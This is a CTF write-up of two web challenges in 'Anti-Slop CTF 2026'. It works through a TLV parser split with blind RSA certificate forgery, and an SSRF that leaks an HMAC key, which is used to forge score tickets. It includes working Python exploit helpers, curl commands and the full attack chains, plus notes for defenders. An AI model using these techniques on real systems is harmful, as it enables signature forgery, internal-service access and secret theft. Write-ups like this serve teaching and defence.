---
title: "Anti-Slop CTF 2026 Web Writeup: Slipstream Cache + SloppedRider"
slug: "anti-slopctf-2026-web-writeup"
description: "Step-by-step web writeup for Anti-Slop CTF 2026. Slipstream Cache: TLV parser-split + blind RSA. SloppedRider: SSRF reflection leaks the HMAC key for a forged ride ticket."
date: 2026-06-21T22:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["Anti-Slop CTF 2026"]
tags:
  - "anti-slop ctf"
  - "anti-slopctf 2026"
  - "web exploitation"
  - "ssrf"
  - "blind rsa signature"
  - "hmac key leak"
  - "parser differential"
  - "tlv format"
  - "node.js express"
  - "loopback ssrf"
keywords:
  - "anti-slop ctf 2026 web writeup"
  - "anti-slopctf web writeup"
  - "slipstream cache writeup"
  - "slopped rider writeup"
  - "spk1 package format ctf"
  - "tlv parser differential ctf"
  - "blind rsa signing oracle ctf"
  - "ssrf loopback http ctf"
  - "hmac key leak via ssrf"
  - "forged ride ticket ctf"
  - "signed_len manifest_len split"
  - "ctf web step by step"
toc: true
cover:
  image: "/images/articles/anti-slopctf-2026-web-writeup.png"
  alt: "Anti-Slop CTF 2026 web writeup — Slipstream Cache TLV parser split and SloppedRider SSRF-to-HMAC-key leak"
---

The premise of **Anti-Slop CTF 2026** is in the name, and this **CyberSecurity Elite** web writeup leans into it. It's a CTF built to punish lazy solving and reward people who read code. The web track had two challenges that hit that brief exactly: **Slipstream Cache**, a custom package registry whose signature verifier and installer disagreed about which bytes were authenticated, and **SloppedRider**, a Node app whose error path leaked the HMAC key that signed its own score tickets. Neither one falls to a tool. Both fall to a careful read.

This writeup walks both challenges end-to-end, in the order I actually worked them during the event. The goal is reproducibility. Anyone holding the same handouts should be able to follow these steps and land both flags. Source artefacts and full solver scripts live at [Abdelkad3r/Anti-SlopCTF-2026/web](https://github.com/Abdelkad3r/Anti-SlopCTF-2026/tree/main/web).

## The two web challenges

| Challenge | Bug class | Flag |
|---|---|---|
| Slipstream Cache | TLV parser differential + blind RSA on raw digests | `slopped{split_parsers_make_signed_packages_liable}` |
| SloppedRider | SSRF to a loopback ops server whose body leaks back through an error-response field | `slopped{riding_0n_M3?}` |

Both bugs are *composition* failures. The Slipstream verifier and installer were each individually reasonable; their disagreement was the bug. SloppedRider's SSRF and ticket-signing system were each individually fine; the error response that reflected the fetched body back to the caller was the seam. If you take one thing from this writeup, take that. The bugs that pay live in the gaps between components.

## Slipstream Cache

### The setup

Slipstream Cache served a tiny upload UI plus one curl-able sample at `/public/sample`. The whole challenge surface, including the eventual flag route, lives inside one custom binary package format called `SPK1`. There's no exposed endpoint listing, no admin login form, nothing obvious to fuzz. The first move is reversing the sample.

### Step 1 — Pull the sample

```bash
curl -sS http://178.105.199.41:20024/public/sample -o sample.spk
sha256sum sample.spk
# cccff729431bb2aa3e4b047a51464d54dc5c4ade603acd655c109bc98fc139fc  sample.spk
```

A quick hexdump confirms this isn't anything `file(1)` recognises:

```bash
xxd -g1 -l 160 sample.spk
00000000: 53 50 4b 31 01 1b 43 52 54 31 01 0d 73 61 6d 70  SPK1..CRT1..samp
00000010: 6c 65 2d 76 65 6e 64 6f 72 00 80 bc a5 c1 11 d9  le-vendor.......
```

Two magic strings tell us how the format nests. `SPK1` is the outer package. `CRT1` is a certificate body for the vendor `sample-vendor`. There's no zip, no tar, no compression. It's a custom binary container, and the only way through is reading the bytes.

### Step 2 — Upload the unmodified sample and read the verifier

The server's `/api/upload` endpoint returns a verifier transcript that gives away the entire mental model of the package format:

```bash
curl -sS -F package=@sample.spk http://178.105.199.41:20024/api/upload
```

```json
{
  "kid": "13889c7a",
  "role": "public",
  "signed_view": {
    "cmd": "static",
    "name": "lantern"
  },
  "verifier": "vendor=sample-vendor\nrole=public\nkid=13889c7a\nsigned_len=19 manifest_len=32\nname=lantern\ncmd=static\n..."
}
```

Two numbers stand out:

```
signed_len=19
manifest_len=32
```

Right there. The verifier authenticates 19 bytes and the package as a whole carries a 32-byte manifest. Whoever wrote this format embedded two different lengths and didn't reconcile them. Even before reversing the layout I had a working hypothesis: the verifier signs the first 19 bytes and trusts itself, the installer parses all 32 bytes and trusts the verifier, and somewhere in those extra 13 bytes is an unsigned attacker-controllable payload.

### Step 3 — Map the package layout

Working from the hexdump, the offsets fall out:

| Offset | Field |
|---|---|
| `0x000` | `SPK1` magic |
| `0x006` | `CRT1` certificate body starts |
| `0x00a` | Certificate role/class byte |
| `0x09f` | Certificate signature length (2 bytes), then 128-byte RSA signature |
| `0x121` | Package `signed_len` (2 bytes, big-endian) |
| `0x123` | Package `manifest_len` (2 bytes, big-endian) |
| `0x125` | Manifest body starts |
| Manifest end | Package signature length, then RSA signature |

The manifest body itself is TLV-encoded: one byte of tag, two bytes of big-endian length, then the value. A throwaway parser confirms it:

```python
from pathlib import Path

b = Path("sample.spk").read_bytes()
signed_len = int.from_bytes(b[0x121:0x123], "big")
manifest_len = int.from_bytes(b[0x123:0x125], "big")
manifest = b[0x125:0x125 + manifest_len]

print(signed_len, manifest_len)

p = 0
while p < len(manifest):
    tag = manifest[p]
    ln = int.from_bytes(manifest[p+1:p+3], "big")
    val = manifest[p+3:p+3+ln]
    print(tag, ln, val)
    p += 3 + ln
```

Output:

```
19 32
1 7 b'lantern'
2 6 b'static'
4 10 b'cache-warm'
```

The math:

```
tag 1 (name=lantern)  -> 1 + 2 + 7 = 10 bytes
tag 2 (cmd=static)    -> 1 + 2 + 6 =  9 bytes
                                    ---
                                     19 bytes  <- signed_len
tag 4 (cache-warm)    -> 1 + 2 + 10 = 13 bytes (UNSIGNED)
                                    ---
                                     32 bytes  <- manifest_len
```

The first two TLVs are exactly `signed_len`. The verifier signs them and reads them. The installer sees `manifest_len = 32`, so it also reads `tag 4`. The signature does not cover `tag 4`. Anything I append after the signed prefix rides on the original valid signature.

### Step 4 — Turn `signed_len` into SSRF

If `manifest_len` controls what the installer parses, then I can keep the original signed bytes, the original certificate, and the original RSA signature, and just append TLVs that swap out the runtime command.

First attempt: append `tag 2: cmd=fetch`.

```
manifest = 01 0007 "lantern" || 02 0006 "static" || 02 0005 "fetch"
manifest_len = 28
```

Upload that and the verifier still happily reports the *signed* command as `static`, but the installer takes the last `cmd` value it parsed and tries to run it. Two error strings answer the question:

```
unsupported runtime command          <- I used a random made-up cmd here
runtime url must stay on loopback    <- with cmd=fetch
```

`fetch` is a real runtime command and it wants a URL. Iterating tags showed `tag 3` was the URL. So the working unsigned suffix is:

```
02 0005 "fetch"
03 001c "http://127.0.0.1:20024/internal/"
```

A helper that constructs the forged package while preserving every signed byte:

```python
def tlv(tag, value):
    raw = value.encode()
    return bytes([tag]) + len(raw).to_bytes(2, "big") + raw

def package_with_fetch(sample, target_url):
    manifest_len = int.from_bytes(sample[0x123:0x125], "big")
    manifest_end = 0x125 + manifest_len
    original_manifest = sample[0x125:manifest_end]
    sig_block = sample[manifest_end:]

    forged_manifest = original_manifest + tlv(2, "fetch") + tlv(3, target_url)
    forged = bytearray(sample)
    forged[0x123:0x125] = len(forged_manifest).to_bytes(2, "big")
    return bytes(forged[:0x125] + forged_manifest + sig_block)
```

Upload that and the install log returns the body the server fetched from the loopback URL. We now have a loopback-only HTTP client.

### Step 5 — Discover the internal API

Fetching `http://127.0.0.1:20024/internal/` returns a list of maintenance routes:

```
maintenance routes:
- /internal/blind-sign?role=operator&blinded=<hex>
- /internal/flag?cert=<b64>&sig=<b64>
```

Neither is reachable from outside. Both are reachable from the forged fetch package. So now there are two questions: what does `blind-sign` do, and what does `flag` need.

### Step 6 — Understand the certificate signature

The package certificate body runs from offset `0x006` to `0x09f`. Then 2 bytes of length, then 128 bytes of RSA signature.

```python
cert_body = sample[0x006:0x09f]
cert_sig  = sample[0x0a1:0x121]
```

Calling the blind signer with `blinded=01` is the cleanest probe. It asks the oracle to sign the integer 1, which gives back the modulus `n` and exponent `e` in the response. With those values in hand, the certificate signature verifies as:

```python
pow(int.from_bytes(cert_sig, "big"), e, n) == int.from_bytes(
    sha256(cert_body).digest(), "big"
)
```

True. The CA signs the raw SHA-256 digest interpreted as an integer. No PKCS#1 padding, no DigestInfo wrapper, no salt. That makes the endpoint a textbook blind-signature oracle: anything you can phrase as a hashed digest can be signed for you, you just have to blind it first so the oracle doesn't realise what you've asked.

### Step 7 — Find the operator role byte

The certificate role/class byte is at absolute offset `0x00a`, which is offset `0x04` inside `cert_body`. The sample has:

```
43 52 54 31 01 0d ...
CRT1       ^^ role/class = 1 = public
```

Roll the byte to `2` and try to upload. The modified certificate signature is now invalid (because we changed the cert body), but the upload endpoint returns:

```
only public vendor packages may be uploaded
```

That's actually useful information. The server *recognised* the certificate format but refused the role. Role `1` is public. Role `2` looks like operator. The internal flag route asks specifically for an operator certificate, so role `2` is what we need.

### Step 8 — Blind-sign the operator certificate

The protocol shape is the canonical RSA blind-signature dance:

1. `cert_body = sample[0x006:0x09f]`
2. `cert_body[0x04] = 2` (flip public → operator)
3. `m = int(sha256(cert_body).digest())`
4. Pick random `r` with `gcd(r, n) == 1`
5. Send `blinded = (m * pow(r, e, n)) % n` to `/internal/blind-sign`
6. Receive `signed_blinded` from the response
7. Compute `sig = signed_blinded * pow(r, -1, n) % n`
8. Assert `pow(sig, e, n) == m` as a sanity check

The oracle sees `m * r^e`. It returns `(m * r^e)^d = m^d * r^(ed) = m^d * r`. Multiplying by `r^-1` gives `m^d`, which is what we want, and the oracle never sees the unblinded `m` it just signed. Standard primitive.

The flag endpoint expects the certificate in a specific frame:

```
cert = base64(cert_body || uint16(128) || sig)
sig  = base64(sig)
```

### Step 9 — Pull the flag

The final request, sent through the same forged fetch package as everything else:

```
http://127.0.0.1:20024/internal/flag?cert=<b64>&sig=<b64>
```

Response body, returned in the install log:

```
slopped{split_parsers_make_signed_packages_liable}
```

That flag spells it out. Two parsers, one signature, different verdicts.

### Why Slipstream Cache works

Three independently-reasonable design choices compose into the win:

The verifier and the installer were written by people who agreed on the *format* but not on the *trust boundary*. The verifier authenticated `signed_len` bytes because that's what it had a signature for. The installer parsed `manifest_len` bytes because that's what the format header said. Neither one was strictly wrong on its own.

The CA signed raw hash digests with no padding. That's an obvious shortcut for a custom format, but it's exactly the property that makes a blind-signature attack work. RSA signatures with proper PKCS#1 v1.5 or PSS padding aren't blindable in the same way because the padding depends on the message in a non-multiplicative way.

The flag route accepted any cert with role byte 2. It didn't check the issuer, didn't check a revocation list, didn't check the kid. Anything signed by the CA at role 2 was accepted.

Each one of those is a yellow flag in code review. Together they're a complete chain.

## SloppedRider

### The setup

SloppedRider is a Node/Express app whose UI shows a motorbike riding game where the terrain is generated from real stock charts. You ride the chart, score points, submit the score with a signed ride ticket. The flag unlocks at `TARGET_SCORE = 676767`. The highest score any legitimate ride can produce is capped at `5000`. The gap between legitimate play and the flag is about 135×.

Two routes matter:

```
POST /api/chart/preview   — fetches an arbitrary URL server-side, parses as chart JSON
POST /api/score           — verifies a signed ride ticket, checks score <= ticket.cap, awards flag if score >= TARGET_SCORE
```

The signing key, `SCORE_KEY`, is generated once at server startup:

```js
const SCORE_KEY =
  process.env.SCORE_KEY ||
  crypto.randomBytes(32).toString("hex");
```

If you know `SCORE_KEY` you can forge any ride ticket with any `cap` you want.

### Step 1 — Confirm the ticket signature is what gates the score

Pulling any chart and inspecting the response shows the ticket structure:

```json
{
  "v": 1,
  "kind": "ride",
  "symbol": "TSLA",
  "period": "5y",
  "cap": 4500,
  "iat": 1749123456
}
```

Encoded as `base64url(JSON) + "." + base64url(HMAC-SHA256(payload, SCORE_KEY))`. The server verifies the signature with `crypto.timingSafeEqual` (so timing-side-channel attacks won't work), then enforces `score <= ticket.cap`. There's no clever bypass at the score-checking layer. The only way through is to forge a ticket whose `cap` is at least `676767`, and the only way to forge it is to know `SCORE_KEY`.

### Step 2 — Spot the preview endpoint's SSRF

`POST /api/chart/preview` reads a `url` from the request body and fetches it server-side using Node's built-in `http`/`https` modules:

```js
if (!["http:", "https:"].includes(parsed.protocol)) {
  reject(new Error("only http(s) chart feeds are supported"));
  return;
}
```

Protocol is restricted to `http:` and `https:`. There's a 2.5-second timeout and a 64 KB body cap. **No allow-list, no DNS-rebinding protection, no loopback/private-range block.** That last one is the giveaway. If the only constraint is "must speak HTTP", then any HTTP service the container can reach is fair game, `127.0.0.1` included.

### Step 3 — Find the internal ops server

A grep through `server.js` answers the next question directly: there's a second listener bound to loopback only.

```js
function createOpsServer() {
  const server = net.createServer((socket) => {
    socket.once("data", (buf) => {
      const firstLine = String(buf).split("\r\n")[0] || "";
      const pathPart = firstLine.split(" ")[1] || "/";
      let body;
      if (pathPart === "/health") {
        body = JSON.stringify({ ok: true, service: "sloppedrider-ops" });
      } else if (pathPart === "/ops/config") {
        body = JSON.stringify({
          service: "sloppedrider-ops",
          scoreKey: SCORE_KEY,
          targetScore: TARGET_SCORE,
          note: "score tickets are HMAC-SHA256 over the base64url JSON payload"
        });
      }
      // ...
    });
  });
  server.listen(OPS_PORT, "127.0.0.1");
}
```

`127.0.0.1:43219/ops/config` returns the `SCORE_KEY` in plaintext. The whole challenge collapses to "make the preview endpoint fetch that URL and find a way to read the body in the response".

### Step 4 — Make the error path give back the body

Without source, the natural first attempt is:

```
POST /api/chart/preview
{"url": "http://127.0.0.1:43219/ops/config"}
```

The ops server responds with a JSON object that has no `prices` array. `normalizeChart()` rejects it. The endpoint returns an error, **but the error path includes the first 600 bytes of the fetched body in a `sample` field**:

```js
res.status(400).json({
  error: "chart feed must include 8-256 positive prices",
  sample: result.body.slice(0, 600)
});
```

That's the entire bug. The author's intent was probably to help the user debug "wait, what did my chart server actually return?" — sensible on a normal user-controlled chart server. On an attacker-controlled URL pointing at loopback, the `sample` field becomes a body-reflection oracle.

The response to the SSRF request looks like:

```json
{
  "error": "chart feed must include 8-256 positive prices",
  "sample": "{\"service\":\"sloppedrider-ops\",\"scoreKey\":\"3b6bbb0ab2921dee71771f9b07a7974fc475f206fd9534f6bc15d73bfef94d94\",\"targetScore\":676767,\"note\":\"score tickets are HMAC-SHA256 over the base64url JSON payload\"}"
}
```

The `scoreKey` is right there in plaintext.

### Step 5 — Forge a winning ride ticket

With the key, the rest is mechanical. Build the JSON payload with `cap` at the target, base64url-encode, HMAC-SHA256 it with the key, base64url the signature, join with a `.`:

```python
import base64, hmac, json, time
from hashlib import sha256

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

score_key = "3b6bbb0ab2921dee71771f9b07a7974fc475f206fd9534f6bc15d73bfef94d94"

payload = {
    "v": 1,
    "kind": "preview",
    "symbol": "SLOP",
    "period": "1y",
    "cap": 676767,
    "iat": int(time.time()),
}

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = hmac.new(score_key.encode(), payload_b64.encode(), sha256).digest()
ride_ticket = f"{payload_b64}.{b64url(sig)}"
```

A subtle note worth flagging: the server signs the payload as the `base64url` string, not the raw JSON bytes. If you HMAC the JSON directly instead of the base64url-encoded form, the signature will fail verification and you'll spend a confused half hour. Read `signPayload` in `server.js`:

```js
function signPayload(payload) {
  return crypto.createHmac("sha256", SCORE_KEY).update(payload).digest("base64url");
}

function makeTicket(data) {
  const payload = encodeJson(data);
  return `${payload}.${signPayload(payload)}`;
}
```

`payload` here is already the base64url-encoded JSON. That's what gets HMAC'd. Match the same order in your forge or it won't validate.

### Step 6 — Submit the score

```
POST /api/score
{
  "score": 676767,
  "nick": "slop-tester",
  "rideTicket": "<payload_b64>.<sig_b64>"
}
```

Server-side flow:

1. `verifyTicket()` validates the signature. The forge passes because the key matches.
2. `score <= ticket.cap` → `676767 <= 676767`. Pass.
3. `score >= TARGET_SCORE` → `676767 >= 676767`. Pass.
4. Response includes `flag` in the JSON body.

```json
{
  "ok": true,
  "rank": 1,
  "flag": "slopped{riding_0n_M3?}"
}
```

### Why SloppedRider works

The two bugs are individually almost defensible.

SSRF to an internal port is a well-known risk, but lots of small services don't bother defending against it because "we don't expose any internal services", right up until they do. The ops server existed because somebody wanted a way to read the runtime config without restarting. Reasonable enough. Binding to loopback was meant to be the defence. It's not, in the presence of SSRF.

Echoing the fetched body in an error response is a debugging convenience. On a user-controlled chart server it's helpful. On an attacker-pointed loopback URL it's a body-exfiltration primitive. The fix is one line: drop the `sample` field, or constrain it to a checked subset of the parsed JSON.

Either fix alone breaks the chain. The lesson is the same one Slipstream Cache taught: audit the seams, not the components.

## Cross-cutting defender notes

Two recurring patterns from the web track that are worth lifting out as findings any code review should chase:

**Two parsers, one signature.** Slipstream Cache is the textbook version of this bug class. Anywhere a signed blob carries length fields, every consumer that reads those length fields must agree on which range is signed. Stripe's signature header parsing, JWT `alg=none` confusion, and the classic `Content-Length` vs `Transfer-Encoding` HTTP request smuggling are all the same bug at different layers. The fix in custom formats is to sign a canonical structured payload (CBOR or a fixed-layout struct) and explicitly include any length fields *inside* the signed range.

**Error responses that leak internal state.** SloppedRider's `sample` field is a small example of a much broader anti-pattern. Anywhere your error path includes "the thing the user gave me so they can debug what went wrong", check whether "the thing the user gave me" could be a redirect, a URL, or any other reference to attacker-uncontrolled data. The Stripe webhook signature failure response, the Slack webhook error envelope, and dozens of plugin-store APIs have shipped variants of this. Sanitise to a checked-shape subset, or drop the body entirely.

**Raw-digest RSA signing without padding.** Slipstream's CA is what made the operator certificate forge work. PKCS#1 v1.5 and RSASSA-PSS exist precisely to prevent multiplicative blinding attacks on RSA signatures. Custom protocols that sign `int(SHA256(m))` directly are inviting blind-signature abuse. Use a padded scheme. If you can't, use Ed25519 instead, which doesn't have the same algebraic structure.

## Frequently asked questions

### What is Anti-Slop CTF?

Anti-Slop CTF is a Jeopardy-style CTF whose challenges are explicitly designed to defeat low-effort, tool-driven, or pattern-matched solving. Most challenges require reading source or reverse-engineering a custom format. The flag prefix is `slopped{...}` and the writeup compilation is at [Abdelkad3r/Anti-SlopCTF-2026](https://github.com/Abdelkad3r/Anti-SlopCTF-2026).

### What's the bug in Slipstream Cache?

The package format carries two length fields, `signed_len` and `manifest_len`. The signature verifier authenticates only `signed_len` bytes of the manifest. The installer parses the full `manifest_len` bytes. By preserving the signed prefix and appending unsigned TLVs, you can switch the runtime command from a benign `static` to a `fetch` against an attacker-supplied URL, including loopback URLs. That gives SSRF to internal routes, including a blind RSA signing oracle, which you then use to forge an operator certificate for the internal flag endpoint.

### What's the blind RSA signature step?

The internal `/internal/blind-sign` endpoint signs raw SHA-256 digests with no PKCS#1 padding. That's the algebraic precondition for RSA blind signatures. You take the digest of your modified certificate body, multiply it by `r^e mod n` for a random `r`, send the blinded value, get back `(m * r^e)^d = m^d * r`, multiply by `r^-1 mod n`, and you have a valid signature on the modified certificate body. The signer never sees the unblinded message.

### How do you get from SSRF to the flag in SloppedRider?

The internal ops server bound to `127.0.0.1:43219` exposes `/ops/config`, which returns the `SCORE_KEY` used to sign ride tickets. The public `/api/chart/preview` endpoint fetches an attacker-supplied URL server-side with no loopback block. The fetched body is normally parsed as a chart, but if it fails parsing, the error response includes the first 600 bytes of the raw body in a `sample` field. SSRF the preview endpoint at the ops config URL, read `scoreKey` from the `sample` field, forge a ride ticket with `cap: 676767`, submit `score: 676767`.

### Why doesn't `crypto.timingSafeEqual` help here?

`timingSafeEqual` defends against timing side-channels on the *signature comparison itself*. It does not defend against an attacker who already has the HMAC key. Once `SCORE_KEY` leaks, the attacker computes the exact correct signature without any guessing or timing observation. The defence stops a wholly different attack class.

### How is the SloppedRider ticket actually signed?

The server `base64url`-encodes the JSON payload, then `HMAC-SHA256`s the **encoded string** (not the raw JSON bytes) using `SCORE_KEY`, then `base64url`-encodes the signature. The final ticket is `<payload_b64>.<sig_b64>`. If your forge HMACs the raw JSON instead of the encoded form, verification will silently fail. Read `signPayload` and `makeTicket` in `server.js` to match the order.

### Could you reach the flag in SloppedRider without finding the ops server?

In principle, any internal service running on the host with a fetchable HTTP endpoint and useful state would do. In practice, this challenge wired up exactly one internal listener (`OPS_PORT = 43219`) carrying exactly one useful secret. Without the ops server, you would have to find another way to read process state. `/proc/self/environ` over `file://` is blocked by the protocol check; there's no path-traversal anywhere. The ops server is the intended path and the only path.

### Where can I find the full solver scripts?

Source artefacts and full solvers for both web challenges live at [Abdelkad3r/Anti-SlopCTF-2026/web](https://github.com/Abdelkad3r/Anti-SlopCTF-2026/tree/main/web). Slipstream Cache has a complete Python solver in `exploit.py` plus the `sample.spk` handout; SloppedRider has the full Node server source under `slopped-rider/` so you can run it locally and reproduce the attack against your own instance.

### What's the broader lesson from the Anti-Slop CTF web track?

Both bugs sit in the gap between components that were each individually reasonable. Slipstream's verifier and installer disagreed about which bytes mattered. SloppedRider's SSRF protection and error-response policy disagreed about which information could leave the server. Production protocol reviews that audit each component in isolation will miss both. Reviews that draw the data-flow diagram and ask "what crosses each boundary?" catch them on the first read.

## Closing notes

Both flags landed in roughly the same amount of time, around an hour each, mostly spent in source. Neither challenge had a "trick" in the sense of an obscure RFC quirk or a one-off CVE re-use. They were both careful design failures, of the kind that a real protocol or product review would surface if it asked the right boundary questions.

The repository at [Abdelkad3r/Anti-SlopCTF-2026](https://github.com/Abdelkad3r/Anti-SlopCTF-2026) contains writeups for all 14 challenges across the event (OSINT, web, misc, crypto, reverse, pwn, blockchain). For more web-flavoured writeups on this site, see the [SCTF 2026 writeup](/ctf-writeups/sctf-2026-writeup/) (TWAP oracle eviction + Groth16 witness) or the [GPN CTF 2026 master writeup](/ctf-writeups/gpn-ctf-2026-writeup/) (19 challenges across reverse, crypto, web, pwn, misc). The full [CTF writeups index](/ctf-writeups/) covers the rest of the engagements.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is Anti-Slop CTF?","acceptedAnswer": {"@type": "Answer","text": "Anti-Slop CTF is a Jeopardy-style CTF whose challenges are explicitly designed to defeat low-effort, tool-driven, or pattern-matched solving. Most challenges require reading source or reverse-engineering a custom format. The flag prefix is slopped{...} and the writeup compilation is at github.com/Abdelkad3r/Anti-SlopCTF-2026."}},
    {"@type": "Question","name": "What's the bug in Slipstream Cache?","acceptedAnswer": {"@type": "Answer","text": "The package format carries two length fields, signed_len and manifest_len. The signature verifier authenticates only signed_len bytes of the manifest. The installer parses the full manifest_len bytes. By preserving the signed prefix and appending unsigned TLVs, you switch the runtime command from a benign static to a fetch against an attacker URL, including loopback. That gives SSRF to a blind RSA signing oracle, which you use to forge an operator certificate for the internal flag endpoint."}},
    {"@type": "Question","name": "What's the blind RSA signature step?","acceptedAnswer": {"@type": "Answer","text": "The internal /internal/blind-sign endpoint signs raw SHA-256 digests with no PKCS#1 padding. That is the algebraic precondition for RSA blind signatures. Take the digest of your modified certificate body, multiply by r^e mod n for random r, send the blinded value, receive (m * r^e)^d = m^d * r, multiply by r^-1 mod n, and you have a valid signature on the modified body. The signer never sees the unblinded message."}},
    {"@type": "Question","name": "How do you get from SSRF to the flag in SloppedRider?","acceptedAnswer": {"@type": "Answer","text": "The internal ops server bound to 127.0.0.1:43219 exposes /ops/config, which returns the SCORE_KEY used to sign ride tickets. The public /api/chart/preview endpoint fetches an attacker-supplied URL with no loopback block. On parse failure, the error response includes the first 600 bytes of the raw body in a sample field. SSRF the preview endpoint at the ops config URL, read scoreKey, forge a ride ticket with cap: 676767, submit score: 676767."}},
    {"@type": "Question","name": "Why doesn't crypto.timingSafeEqual help here?","acceptedAnswer": {"@type": "Answer","text": "timingSafeEqual defends against timing side-channels on the signature comparison. It does not defend against an attacker who already has the HMAC key — once SCORE_KEY leaks, the attacker computes the correct signature directly. Different attack class."}},
    {"@type": "Question","name": "How is the SloppedRider ticket actually signed?","acceptedAnswer": {"@type": "Answer","text": "The server base64url-encodes the JSON payload, HMAC-SHA256s the encoded string (not the raw JSON bytes) using SCORE_KEY, then base64url-encodes the signature. The final ticket is <payload_b64>.<sig_b64>. If your forge HMACs the raw JSON instead, verification fails silently. Match the encode-then-HMAC order in signPayload."}},
    {"@type": "Question","name": "Could you reach the flag in SloppedRider without finding the ops server?","acceptedAnswer": {"@type": "Answer","text": "In principle any internal HTTP service with useful state would do. In practice this challenge wired up one internal listener carrying exactly one useful secret. Without it, you would have to find another way to read process state — /proc/self/environ over file:// is blocked by the protocol check; there is no path-traversal anywhere. The ops server is the intended path and the only path."}},
    {"@type": "Question","name": "Where can I find the full solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Source artefacts and solvers for both web challenges are at github.com/Abdelkad3r/Anti-SlopCTF-2026/web. Slipstream Cache has a complete Python solver in exploit.py plus the sample.spk handout; SloppedRider has the full Node server source so you can run it locally and reproduce the attack against your own instance."}},
    {"@type": "Question","name": "What is the broader lesson from the Anti-Slop CTF web track?","acceptedAnswer": {"@type": "Answer","text": "Both bugs sit in the gap between components that were each individually reasonable. Slipstream's verifier and installer disagreed about which bytes mattered. SloppedRider's SSRF protection and error-response policy disagreed about which information could leave the server. Reviews that audit each component in isolation miss both. Reviews that draw the data-flow diagram and ask what crosses each boundary catch them."}}
  ]
}
</script>
